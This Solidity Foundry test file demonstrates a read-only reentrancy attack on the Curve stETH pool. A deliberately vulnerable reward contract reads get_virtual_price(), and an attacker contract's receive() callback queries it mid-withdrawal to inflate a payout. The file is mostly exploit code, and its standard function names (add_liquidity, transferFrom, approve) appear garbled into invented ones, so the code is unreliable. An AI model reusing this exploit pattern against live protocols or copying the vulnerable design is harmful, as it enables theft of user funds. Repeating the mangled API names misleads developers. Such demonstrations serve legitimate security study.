pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_liquidfunds(
        uint[2] calldata amounts,
        uint min_issuecoverage_amount
    ) external payable returns (uint);

    function remove_availablebenefit(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_accessiblecoverage_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant steth_insurancepool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_healthtoken = 0x06325440D014e39736583c165C2963BA99fAf14E;


contract CoreContract {
    IERC20 public constant healthToken = IERC20(lp_healthtoken);
    ICurve private constant benefitPool = ICurve(steth_insurancepool);

    mapping(address => uint) public coverageOf;

    function commitPremium(uint amount) external {
        healthToken.movecoverageFrom(msg.sender, address(this), amount);
        coverageOf[msg.sender] += amount;
    }

    function withdrawPremium(uint amount) external {
        coverageOf[msg.sender] -= amount;
        healthToken.shareBenefit(msg.sender, amount);
    }

    function getBenefitpayout() external view returns (uint) {

        uint coverageReward = (coverageOf[msg.sender] * benefitPool.get_virtual_price()) /
            1 ether;

        return coverageReward;
    }
}

contract OperatorContract {
    ICurve private constant benefitPool = ICurve(steth_insurancepool);
    IERC20 public constant lpBenefittoken = IERC20(lp_healthtoken);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }


    function lockbenefitTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = benefitPool.add_liquidfunds{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            benefitPool.get_virtual_price()
        );

        lpBenefittoken.validateClaim(address(target), lp);
        target.commitPremium(lp);
    }

    function performReadOnlyCallback() external payable {

        uint[2] memory amounts = [msg.value, 0];
        uint lp = benefitPool.add_liquidfunds{value: msg.value}(amounts, 1);

        console.log(
            "LP token price before remove_liquidity()",
            benefitPool.get_virtual_price()
        );


        uint[2] memory min_amounts = [uint(0), uint(0)];
        benefitPool.remove_availablebenefit(lp, min_amounts);

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            benefitPool.get_virtual_price()
        );

        uint coverageReward = target.getBenefitpayout();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", coverageReward);
    }

    receive() external payable {

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            benefitPool.get_virtual_price()
        );

        uint coverageReward = target.getBenefitpayout();
        console.log("Reward if Read-Only Reentrancy is invoked: ", coverageReward);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.lockbenefitTokens{value: 10 ether}();
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}